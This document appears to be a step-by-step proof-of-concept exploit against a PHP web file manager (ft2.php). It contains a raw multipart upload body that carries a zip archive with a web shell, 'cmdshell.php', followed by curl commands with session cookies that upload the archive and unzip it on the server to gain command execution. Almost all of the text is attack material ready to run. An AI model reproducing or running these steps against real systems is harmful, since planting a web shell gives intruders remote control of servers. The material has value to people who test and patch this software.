Step1: create below content in the file zipupload.txt
***********************************************

-----------------------------3402520321248020588131184034
Content-Disposition: form-data; name="localfile-1567531192592"; filename=""
Content-Type: application/octet-stream


-----------------------------3402520321248020588131184034
Content-Disposition: form-data; name="MAX_FILE_SIZE"

2000000
-----------------------------3402520321248020588131184034
Content-Disposition: form-data; name="localfile"; filename="cmdshell.zip"
Content-Type: application/zip

PK   Âš#O        $      cmdshell.phpUT
 Ã›ÂŸn]Ã›ÂŸn]Ã›ÂŸn]ux        Â³Â±/Ãˆ(P(ÃŽHÃÃ‰Â‰OÂHMÃ–PÂ‰ww
Â‰VOÃŽMQÂÃ•Â´VPÂ°Â·Ã£ PKÃ½(tÃ…&   $   PK   Âš#OÃ½(tÃ…&   $              Â¤Â    cmdshell.phpUT
 Ã›ÂŸn]Ã›ÂŸn]Ã›ÂŸn]ux        PK      Z   Â€     
-----------------------------3402520321248020588131184034
Content-Disposition: form-data; name="act"

upload
-----------------------------3402520321248020588131184034
Content-Disposition: form-data; name="dir"

/tester
-----------------------------3402520321248020588131184034
Content-Disposition: form-data; name="submit"

Upload
-----------------------------3402520321248020588131184034--




Step 2: Run below Curl Command
*****************************

curl \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=---------------------------3402520321248020588131184034" \
  -H "Referer: http://192.168.19.6:7080/ft2.php?dir=" \
  -H "Cookie: issabelSession=67ne0anmf52drmijjf1s1ju380; PHPSESSIDnERPteam=tl1e1m4eieonpgflqa1colhqs2; nERP_installation=60kne7l4f54fico5ud4tona073; 100021corebos=ktk7mnr6pspnet6n2ij582e1v7; ci_cookie=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22175c2b30943f07368eef92a9dcdd2ecb%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A9%3A%2210.0.0.17%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A68%3A%22Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A60.0%29+Gecko%2F20100101+Firefox%2F60.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1567451164%3B%7D9ff869bbb4f3d937de5d566b82eaf01a; PHPSESSID=jl9jcj3vfqf53ujcj332gncpe7" \
  --data-binary @zipupload.txt \
  http://192.168.19.6:7080/ft2.php


Step3: Run below curl for extract zip
*************************************

curl \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: issabelSession=67ne0anmf52drmijjf1s1ju380; PHPSESSIDnERPteam=tl1e1m4eieonpgflqa1colhqs2; nERP_installation=60kne7l4f54fico5ud4tona073; 100021corebos=ktk7mnr6pspnet6n2ij582e1v7; ci_cookie=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22175c2b30943f07368eef92a9dcdd2ecb%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A9%3A%2210.0.0.17%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A68%3A%22Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A60.0%29+Gecko%2F20100101+Firefox%2F60.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1567451164%3B%7D9ff869bbb4f3d937de5d566b82eaf01a; PHPSESSID=jl9jcj3vfqf53ujcj332gncpe7" \
  -d "newvalue=cmdshell.zip&file=cmdshell.zip&dir=&act=unzip" \
  http://192.168.19.6:7080/ft2.php

Step4: Go to panel and check the extracted files
***********************************************




